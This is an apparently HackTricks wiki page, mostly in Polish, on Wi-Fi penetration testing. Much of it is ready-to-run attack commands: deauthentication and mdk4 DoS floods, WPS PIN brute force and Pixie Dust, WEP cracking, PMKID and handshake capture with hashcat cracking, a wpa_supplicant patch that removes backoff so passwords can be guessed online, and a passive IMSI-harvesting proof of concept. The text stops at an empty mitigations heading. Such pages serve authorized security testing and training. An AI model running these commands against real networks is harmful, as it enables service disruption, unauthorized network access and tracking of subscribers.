# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe polecenia Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Narzędzia

### Hijacker & NexMon (wewnętrzne Wi‑Fi Androida)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Uruchom airgeddon z użyciem docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
Źródło: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Może przeprowadzać ataki Evil Twin, KARMA i Known Beacons, a następnie użyć phishing template, aby uzyskać prawdziwe hasło do sieci lub przechwycić dane logowania do serwisów społecznościowych.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

To narzędzie automatyzuje ataki **WPS/WEP/WPA-PSK**. Automatycznie:

- Ustawi interfejs w monitor mode
- Skanuje dostępne sieci i pozwoli wybrać cel(e)
- Jeśli WEP — uruchomi ataki WEP
- Jeśli WPA-PSK
- Jeśli WPS: Pixie dust attack oraz bruteforce attack (uwaga: brute-force może zająć dużo czasu). Zauważ, że nie próbuje null PIN ani PIN-ów z bazy/generowanych.
- Spróbuje przechwycić PMKID z AP, aby go crackować
- Spróbuje deauthenticate klientów AP, żeby przechwycić handshake
- Jeśli PMKID lub Handshake, spróbuje przeprowadzić bruteforce używając top5000 passwords.

## Podsumowanie ataków

- **DoS**
- Deauthentication/disassociation -- Rozłączy wszystkich (lub konkretny ESSID/Client)
- Random fake APs -- Ukrywa sieci, możliwe crash scanners
- Overload AP -- Próba zablokowania AP (zwykle niezbyt przydatne)
- WIDS -- Manipulacja IDS
- TKIP, EAPOL -- Specyficzne ataki DoS na niektóre AP
- **Cracking**
- Crack **WEP** (kilka narzędzi i metod)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Przydatne do przechwytywania captive portal creds i/lub przeprowadzania ataków w LAN
- **WPA-PSK** Evil Twin -- Przydatne do ataków na sieć, jeśli znasz hasło
- **WPA-MGT** -- Przydatne do przechwytywania company credentials
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Przydatne do przechwytywania captive portal creds i/lub przeprowadzania ataków LAN
- **+ WPA** -- Przydatne do przechwytywania WPA handshakes

## Szybkie uwagi o sieciach Open / OWE

- **Passive capture** na otwartych SSID wciąż działa przy użyciu monitor mode i tcpdump:
```bash
iw wlan0 set type monitor
ip link set wlan0 up
iw wlan0 set channel 6
tcpdump -i wlan0 -w capture.pcap
```
- **OWE** (Opportunistic Wireless Encryption) wykonuje wymianę kluczy per-stacja (brak PSK), więc ramki powietrzne są szyfrowane nawet na "open" SSID-ach. Jako że opiera się na WPA3, wymusza też **802.11w PMF**, które blokuje sfałszowane ramki deauth/disassoc.
- **OWE** **does not authenticate** joiners: anyone can associate, więc zamiast polegać na hasłach marketingowych **verify client isolation**. Bez izolacji nadal działają ARP spoofing lub responder-style poisoning na lokalnym L2.
- **Evil Twin** pozostaje wykonalny na open/OWE SSID-ach przez wystawienie silniejszego sygnału; PMF jedynie usuwa skrót z użycia deauth. Jeśli ofiary zaakceptują sfałszowany certyfikat TLS, odzyskuje się pełne HTTP(S) MitM.
- **Broadcast poisoning** on open guest Wi-Fi łatwo daje creds/hashes (LLMNR/NBT-NS/mDNS). See:

{{#ref}}
../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## DOS

### Deauthentication Packets

**Opis pochodzi z** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** attacks, powszechna metoda w Wi-Fi hacking, polegają na fałszowaniu ramek "management", aby **na siłę rozłączyć urządzenia z sieci**. Te nieszyfrowane pakiety wprowadzają klientów w błąd, sprawiając, że myślą, iż pochodzą od prawdziwej sieci, co umożliwia atakującym zebranie WPA handshakes w celach crackingu lub trwałe zakłócanie połączeń sieciowych. Ta taktyka, niepokojąca swoją prostotą, jest szeroko stosowana i ma poważne konsekwencje dla bezpieczeństwa sieci.

**Deauthentication przy użyciu Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 oznacza deauthentication
- 1 to liczba deauths do wysłania (możesz wysłać kilka, jeśli chcesz); 0 oznacza wysyłanie ich ciągle
- -a 00:14:6C:7E:40:80 to adres MAC punktu dostępowego (AP)
- -c 00:0F:B5:34:30:30 to adres MAC klienta do deauthenticate; jeśli jest pominięty, wysyłana jest broadcast deauthentication (nie zawsze działa)
- ath0 to nazwa interfejsu

### Disassociation Packets

**Disassociation packets**, podobnie jak deauthentication packets, są rodzajem management frame używanych w sieciach Wi‑Fi. Pakiety te służą do zerwania połączenia między urządzeniem (takim jak laptop lub smartfon) a punktem dostępowym (AP). Podstawowa różnica między disassociation a deauthentication leży w scenariuszach użycia. Podczas gdy AP emituje **deauthentication packets**, aby wyraźnie usunąć rogue devices z sieci, **disassociation packets** są zazwyczaj wysyłane, gdy AP jest wyłączany, restartowany lub przenoszony, co wymaga rozłączenia wszystkich podłączonych węzłów.

**Ten atak można wykonać za pomocą mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Więcej ataków DOS przez mdk4**

**W** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Wysyła beacon frames, żeby pokazać fake APs klientom. Czasami może to spowodować crash network scanners, a nawet drivers!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Wysyłanie ramek uwierzytelniających do wszystkich dostępnych Access Points (APs) w zasięgu może przeciążyć te APs, szczególnie gdy zaangażowanych jest wielu klientów. Ten intensywny ruch może doprowadzić do niestabilności systemu, powodując, że niektóre APs zawieszą się lub nawet zresetują.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) sprawdza, czy SSID jest prawidłowo ujawniony i potwierdza zasięg AP. Ta technika, w połączeniu z **bruteforcing hidden SSIDs** z użyciem lub bez wordlist, pomaga w identyfikacji i uzyskaniu dostępu do ukrytych sieci.

**ATTACK MODE m: Michael Countermeasures Exploitation**

Wysyłanie losowych lub zduplikowanych pakietów do różnych kolejek QoS może wywołać Michael Countermeasures na **TKIP APs**, prowadząc do jednominutowego wyłączenia AP. Ta metoda jest efektywną taktyką ataku **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Zalewanie AP **EAPOL Start frames** powoduje powstanie **fake sessions**, przeciążając AP i blokując legalnych klientów. Alternatywnie, wstrzyknięcie **fake EAPOL Logoff messages** wymusza rozłączenie klientów — obie metody skutecznie zakłócają działanie sieci.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Ataki na sieci mesh IEEE 802.11s**

Różne ataki na zarządzanie łączami i routing w sieciach mesh.

**ATTACK MODE w: WIDS Confusion**

Krzyżowe łączenie klientów z wieloma węzłami WDS lub fałszywymi rogue APs może manipulować Intrusion Detection and Prevention Systems, tworząc zamieszanie i potencjalne nadużycie systemu.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

Packet fuzzer oferujący różne źródła pakietów oraz wszechstronny zestaw modyfikatorów do manipulacji pakietami.

### **Airggedon**

_**Airgeddon**_ oferuje większość ataków opisanych we wcześniejszych uwagach:

![](<../../images/image (95).png>)

## WPS

WPS (Wi‑Fi Protected Setup) upraszcza proces podłączania urządzeń do routera, przyspieszając konfigurację i ułatwiając ją w sieciach szyfrowanych **WPA** lub **WPA2** Personal. Jest nieskuteczny wobec łatwo łamanego WEP. WPS używa 8-cyfrowego PINu, weryfikowanego w dwóch częściach, co czyni go podatnym na ataki brute-force z uwagi na ograniczoną liczbę kombinacji (około 11 000 możliwości).

### WPS Bruteforce

Do przeprowadzenia tego ataku służą głównie 2 narzędzia: Reaver i Bully.

- **Reaver** został zaprojektowany jako solidne i praktyczne narzędzie do ataku na WPS i był testowany na szerokiej gamie punktów dostępu oraz implementacji WPS.
- **Bully** to **nowa implementacja** ataku brute force na WPS, napisana w C. Ma kilka zalet w porównaniu z oryginalnym kodem reaver: mniejsze zależności, poprawiona wydajność pamięci i cpu, poprawne obsługiwanie endianness oraz bardziej rozbudowany zestaw opcji.

Atak wykorzystuje **podatność WPS PIN**, w szczególności ujawnianie pierwszych czterech cyfr oraz rolę ostatniej cyfry jako sumy kontrolnej, co ułatwia atak brute-force. Jednak mechanizmy obronne przed atakami brute-force, takie jak **blokowanie adresów MAC** agresywnych atakujących, wymuszają **rotację adresu MAC**, aby kontynuować atak.

Po uzyskaniu WPS PIN przy użyciu narzędzi takich jak Bully lub Reaver, atakujący może wywnioskować WPA/WPA2 PSK, zapewniając **trwały dostęp do sieci**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

To udoskonalone podejście celuje w WPS PINs, wykorzystując znane podatności:

1. **Pre-discovered PINs**: Wykorzystaj bazę danych znanych PIN-ów powiązanych z konkretnymi producentami, którzy zwykle stosują jednolite WPS PINy. Ta baza koreluje pierwsze trzy oktety adresów MAC z prawdopodobnymi PIN-ami dla tych producentów.
2. **PIN Generation Algorithms**: Wykorzystaj algorytmy takie jak ComputePIN i EasyBox, które obliczają WPS PINy na podstawie MAC-address AP. Algorytm Arcadyan dodatkowo wymaga device ID, dodając warstwę do procesu generowania PINu.

### WPS Pixie Dust attack

**Dominique Bongard** odkrył wadę w niektórych Access Points (APs) dotyczącą tworzenia tajnych kodów, znanych jako **nonces** (**E-S1** i **E-S2**). Jeśli te nonces da się odgadnąć, złamanie WPS PINu AP staje się proste. AP ujawnia PIN w specjalnym kodzie (hash), aby udowodnić, że jest autentyczny, a nie fałszywy (rogue) AP. Te nonces są zasadniczo "kluczami" do otwarcia "sejfu", który przechowuje WPS PIN. Więcej na ten temat można znaleźć [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

Prościej mówiąc, problem polega na tym, że niektóre APs nie używały wystarczająco losowych kluczy do szyfrowania PINu podczas procesu łączenia. To sprawia, że PIN jest podatny na odgadnięcie z zewnątrz sieci (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Jeśli nie chcesz przełączać urządzenia w monitor mode, lub `reaver` i `bully` mają jakiś problem, możesz spróbować [OneShot-C](https://github.com/nikita-yfh/OneShot-C). To narzędzie potrafi przeprowadzić Pixie Dust attack bez konieczności przełączania urządzenia w monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Niektóre źle zaprojektowane systemy nawet pozwalają, aby **Null PIN** (pusty lub nieistniejący PIN) przyznawał dostęp, co jest dość nietypowe. Narzędzie **Reaver** potrafi testować tę podatność, w przeciwieństwie do **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

All the proposed WPS attacks can be easily performed using _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 and 6 pozwalają wypróbować **własny PIN** (jeśli go masz)
- 7 and 8 wykonują **Pixie Dust attack**
- 13 pozwala przetestować **NULL PIN**
- 11 and 12 **odzyskują PINy powiązane z wybranym AP z dostępnych baz danych** i **generują** możliwe **PINy** przy użyciu: ComputePIN, EasyBox i opcjonalnie Arcadyan (zalecane, czemu nie?)
- 9 and 10 przetestują **wszystkie możliwe PINy**

## **WEP**

**Dlaczego ulega złamaniu**

- RC4 seed is just **IV (24 bits) + shared key**. The IV is cleartext, tiny (2^24), and repeats quickly, so ciphertexts with the same IV reuse the keystream.
- XORing two ciphertexts with the same keystream leaks `PlaintextA ⊕ PlaintextB`; predictable headers + RC4 KSA biases (**FMS**) let you “vote” key bytes. **PTW** optimises this using ARP traffic to drop requirements to tens of thousands of packets instead of millions.
- Integrity is only **CRC32** (linear/unkeyed), so an attacker can flip bits and recompute CRC32 without the key → packet forgery/replay/ARP injection while waiting for IVs.

Practical break is deterministic:
```bash
airodump-ng --bssid <BSSID> --channel <ch> --write wep_capture wlan1mon  # collect IVs
# optionally speed up IVs without deauth by replaying ARP
aireplay-ng --arpreplay -b <BSSID> -h <clientMAC> wlan1mon
aircrack-ng wep_capture-01.cap  # PTW attack recovers key once IV threshold is met
```
Airgeddon nadal dostarcza "All-in-One" WEP workflow, jeśli wolisz prowadzony UI.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

W 2018 roku **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) nową metodę ataku, wyjątkową ponieważ wymaga tylko **jednej pojedynczej paczki** i nie wymaga, aby jakikolwiek klient był połączony z docelowym AP — wystarczy interakcja między atakującym a AP.

Wiele nowoczesnych routerów dodaje **opcjonalne pole** do **pierwszej ramki EAPOL** podczas nawiązywania asocjacji, znane jako `Robust Security Network`. To zawiera `PMKID`.

Jak wyjaśnia oryginalny post, **PMKID** jest tworzony przy użyciu znanych danych:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Zakładając, że "PMK Name" jest stała, znamy BSSID AP i stację, a `PMK` jest identyczny z tym z pełnego 4-way handshake, **hashcat** może użyć tych informacji, aby złamać PSK i odzyskać passphrase!

Aby **zgromadzić** te informacje i lokalnie **bruteforce** hasło możesz zrobić:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Złapane **PMKIDs captured** zostaną pokazane w **console** i również **zapisane** wewnątrz \_ **/tmp/attack.pcap**\_\
Teraz skonwertuj przechwycenie do formatu **hashcat/john** i crack it:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Zwróć uwagę, że format poprawnego hash zawiera **4 części**, np.: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Jeśli twój **tylko** zawiera **3 części**, to jest **nieprawidłowy** (PMKID capture nie był prawidłowy).

Zauważ, że `hcxdumptool` **również capture handshakes** (coś takiego pojawi się: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Możesz **przekształcić** **handshakes** do formatu **hashcat**/**john** używając `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Zauważyłem, że niektóre handshakes przechwycone tym narzędziem nie dały się złamać nawet przy znajomości poprawnego hasła. Zalecam, jeśli to możliwe, przechwytywać handshakes także tradycyjną metodą, albo przechwycić kilka z nich używając tego narzędzia._

### Handshake capture

Atak na sieci **WPA/WPA2** można przeprowadzić przez przechwycenie **handshake** i próbę **crack** hasła **offline**. Proces ten polega na monitorowaniu komunikacji konkretnej sieci i **BSSID** na określonym **channel**. Oto uproszczony przewodnik:

1. Zidentyfikuj **BSSID**, **channel**, i **connected client** docelowej sieci.
2. Użyj `airodump-ng` do monitorowania ruchu sieciowego na określonym **channel** i **BSSID**, mając nadzieję przechwycić handshake. Polecenie będzie wyglądać tak:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Aby zwiększyć szansę na przechwycenie handshake, chwilowo rozłącz klienta z sieci, aby wymusić ponowną autoryzację. Można to zrobić za pomocą polecenia `aireplay-ng`, które wysyła pakiety deautentykacji do klienta:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Zauważ, że gdy klient został deautentykowany, może spróbować połączyć się z innym AP lub, w innych przypadkach, z inną siecią._

Gdy w `airodump-ng` pojawią się informacje o handshake, oznacza to, że handshake został przechwycony i możesz przestać nasłuchiwać:

![](<../../images/image (172) (1).png>)

Po przechwyceniu handshake możesz go **crack** za pomocą `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Sprawdź, czy plik zawiera handshake

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Jeśli to narzędzie znajdzie nieukończony handshake dla ESSID przed ukończonym handshake, nie wykryje prawidłowego._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
#### Szybsze zgadywanie PSK online przez `wpa_supplicant` ctrl socket (brak klientów/PMKID)

Gdy nie ma klientów w pobliżu, a AP odrzuca PMKID, możesz przetestować PSK online bez ponownego uruchamiania supplicants:

- Zastosuj patch w `wpa_supplicant.c`, aby wymusić `dur = 0;` w logice backoff przy nieudanej autoryzacji (w okolicy `ssid->auth_failures`), efektywnie wyłączając timer tymczasowego wyłączenia.
- Uruchom pojedynczy daemon z control socket:
```bash
# wpa_supplicant.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=root
update_config=1

wpa_supplicant -B -i wlp3s0 -c wpa_supplicant.conf
```
- Steruj nim przez interfejs kontrolny, używając tego samego skanu i sieci:
```text
ADD_NETWORK
SET_NETWORK 0 ssid "<ssid>"
ENABLE_NETWORK 0
SCAN
(loop)
SET_NETWORK 0 psk "<candidate>"
REASSOCIATE
wait for CTRL-EVENT-CONNECTED / DISCONNECTED
```
Mała pętla w Pythonie odczytująca zdarzenia socketów (`CTRL-EVENT-CONNECTED` / `CTRL-EVENT-DISCONNECTED`) może przetestować ~100 prób w ~5 minut bez narzutu skanowania. Wciąż jest jednak głośne i wykrywalne, ale unika restartów procesu przy każdej próbie i opóźnień backoff.

## **WPA Enterprise (MGT)**

W **konfiguracjach enterprise WiFi napotkasz różne metody uwierzytelniania**, z których każda zapewnia różne poziomy bezpieczeństwa i funkcje zarządzania. Gdy używasz narzędzi takich jak `airodump-ng` do przeglądania ruchu sieciowego, możesz zauważyć identyfikatory tych typów uwierzytelniania. Do niektórych powszechnych metod należą:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Ta metoda obsługuje hardware tokeny i one-time passwords w ramach EAP-PEAP. W przeciwieństwie do MSCHAPv2, nie używa peer challenge i wysyła hasła w plaintext do access pointa, co stwarza ryzyko downgrade attacks.
2. **EAP-MD5 (Message Digest 5)**:
- Polega na wysłaniu MD5 hasha hasła od klienta. **Niezalecane** ze względu na podatność na dictionary attacks, brak uwierzytelniania serwera oraz niemożność generowania sesyjnych WEP keyów specyficznych dla sesji.
3. **EAP-TLS (Transport Layer Security)**:
- Wykorzystuje certyfikaty po stronie klienta i serwera do uwierzytelniania i może dynamicznie generować user-based i session-based WEP keys do zabezpieczenia komunikacji.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Zapewnia mutual authentication przez zaszyfrowany tunel oraz metodę do wyprowadzenia dynamicznych, per-user, per-session WEP keys. Wymaga jedynie certyfikatów po stronie serwera, a klienci używają credentials.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Działa podobnie do EAP, tworząc TLS tunnel dla chronionej komunikacji. Pozwala na użycie słabszych protokołów uwierzytelniania w warstwie wewnętrznej EAP dzięki ochronie oferowanej przez tunel.
- **PEAP-MSCHAPv2**: Często nazywane po prostu PEAP — łączy podatny mechanizm challenge/response MSCHAPv2 z ochronnym TLS tunnelem.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Podobne do EAP-TLS, ale inicjuje TLS tunnel zanim nastąpi wymiana certyfikatów, oferując dodatkową warstwę bezpieczeństwa.

You can find more information about these authentication methods [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Username Capture

Reading [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) wygląda na to, że jeśli używasz **EAP** to **"Identity"** **messages** muszą być **supported**, a **username** zostanie wysłany w **clear** w **"Response Identity"** messages.

Nawet używając jednej z najbezpieczniejszych metod uwierzytelniania: **PEAP-EAP-TLS**, możliwe jest **przechwycenie username wysyłanego w protokole EAP**. Aby to zrobić, **przechwyć komunikację uwierzytelniającą** (uruchom `airodump-ng` na danym channel i `wireshark` na tym samym interfejsie) i filtruj pakiety po `eapol`.\
Wewnątrz pakietu "**Response, Identity**" pojawi się **username** klienta.

![](<../../images/image (850).png>)

### Anonymous Identities

Identity hiding jest obsługiwane zarówno przez EAP-PEAP jak i EAP-TTLS. W kontekście sieci WiFi, EAP-Identity request jest zazwyczaj inicjowany przez access point (AP) podczas procesu association. Aby chronić anonimowość użytkownika, odpowiedź od EAP clienta na urządzeniu użytkownika zawiera tylko niezbędne informacje potrzebne początkowemu RADIUS serverowi do przetworzenia żądania. Koncepcję tę ilustrują następujące scenariusze:

- EAP-Identity = anonymous
- W tym scenariuszu wszyscy użytkownicy używają pseudonimu "anonymous" jako identyfikatora użytkownika. Początkowy RADIUS server działa jako serwer EAP-PEAP lub EAP-TTLS, odpowiedzialny za obsługę strony serwera protokołu PEAP lub TTLS. Wewnętrzna (chroniona) metoda uwierzytelniania jest następnie obsługiwana lokalnie lub delegowana do zdalnego (home) RADIUS servera.
- EAP-Identity = anonymous@realm_x
- W tej sytuacji użytkownicy z różnych realms ukrywają swoją tożsamość, jednocześnie wskazując swoje odpowiednie realms. Pozwala to początkowemu RADIUS serverowi na proxy EAP-PEAP lub EAP-TTLS requestów do RADIUS servers w ich home realms, które działają jako PEAP lub TTLS server. Początkowy RADIUS server działa wówczas wyłącznie jako RADIUS relay node.
- Alternatywnie, początkowy RADIUS server może funkcjonować jako EAP-PEAP lub EAP-TTLS server i albo obsłużyć chronioną metodę uwierzytelniania, albo przekazać ją do innego serwera. Ta opcja umożliwia skonfigurowanie różnych polityk dla różnych realms.

W EAP-PEAP, gdy TLS tunnel zostanie ustanowiony między PEAP serverem a PEAP clientem, PEAP server inicjuje EAP-Identity request i przesyła go przez TLS tunnel. Klient odpowiada na to drugie EAP-Identity request, wysyłając EAP-Identity response zawierające prawdziwą tożsamość użytkownika przez zaszyfrowany tunel. To podejście skutecznie zapobiega ujawnieniu rzeczywistej tożsamości użytkownika komukolwiek podsłuchującemu ruch 802.11.

EAP-TTLS stosuje nieco inną procedurę. W EAP-TTLS klient zazwyczaj uwierzytelnia się przy użyciu PAP lub CHAP, zabezpieczonych przez TLS tunnel. W takim przypadku klient dołącza atrybut User-Name oraz albo Password albo CHAP-Password w początkowej wiadomości TLS wysłanej po ustanowieniu tunelu.

Niezależnie od wybranego protokołu, PEAP/TTLS server uzyskuje wiedzę o prawdziwej tożsamości użytkownika po ustanowieniu TLS tunnel. Prawdziwa tożsamość może być reprezentowana jako user@realm lub po prostu user. Jeśli PEAP/TTLS server jest również odpowiedzialny za uwierzytelnienie użytkownika, teraz posiada jego tożsamość i kontynuuje metodę uwierzytelniania chronioną przez TLS tunnel. Alternatywnie, PEAP/TTLS server może przesłać nowe RADIUS request do home RADIUS servera użytkownika. To nowe RADIUS request pomija warstwę protokołu PEAP lub TTLS. W przypadkach, gdy chroniona metoda uwierzytelniania to EAP, wewnętrzne EAP wiadomości są transmisowane do home RADIUS servera bez wrappera EAP-PEAP lub EAP-TTLS. Atrybut User-Name w wychodzącym RADIUS message zawiera prawdziwą tożsamość użytkownika, zastępując anonymous User-Name z przychodzącego RADIUS requestu. Gdy chroniona metoda uwierzytelniania to PAP lub CHAP (obsługiwane tylko przez TTLS), User-Name i inne atrybuty uwierzytelniania wyekstrahowane z TLS payload są podstawiane w wychodzącym RADIUS message, wypierając anonymous User-Name i TTLS EAP-Message attributes znajdujące się w przychodzącym RADIUS request.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X can leak the permanent subscriber identifier (IMSI) in cleartext during the unauthenticated identity phase if the deployment doesn’t implement pseudonyms/protected identities or a TLS tunnel around the inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Kliknij, aby rozwinąć</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Notatki:
- Działa przed jakimkolwiek tunelem TLS, jeśli deployment używa gołego EAP‑SIM/AKA bez chronionej tożsamości/pseudonimów.
- Eksponowana wartość jest trwałym identyfikatorem powiązanym z SIM abonenta; jej zebranie umożliwia długoterminowe śledzenie i dalsze nadużycia w telekomunikacji.

Wpływ
- Prywatność: trwałe śledzenie użytkownika/urządzenia na podstawie pasywnych przechwyceń Wi‑Fi w miejscach publicznych.
- Punkt startowy do nadużyć telekomunikacyjnych: posiadając IMSI, atakujący z dostępem do SS7/Diameter może zapytać o lokalizację lub próbować przechwycenia połączeń/SMS oraz kradzieży MFA.

Środki zaradcze / na co zwrócić uwagę
